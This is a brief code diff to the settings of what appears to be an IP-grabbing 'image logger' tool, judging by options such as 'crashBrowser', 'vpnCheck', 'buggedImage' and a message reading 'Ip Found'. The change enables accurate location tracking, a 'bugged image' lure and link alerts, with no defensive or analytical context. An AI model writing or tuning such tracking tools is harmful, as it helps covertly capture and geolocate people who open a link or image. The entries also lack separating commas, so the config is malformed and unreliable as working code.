@@ -16,11 +16,15 @@ config = {
   #OPTIONS
   "crashBrowser": False
 
-  "accurateLocation": False
+  "accurateLocation": True
   
   "message": {
-    
+    "doMessage": False
+    "message": "Ip Found"
+    "richMessage": False
   },
 
   "vpnCheck": 1
+  "linkAlert": True
+  "buggedImage": True
 }
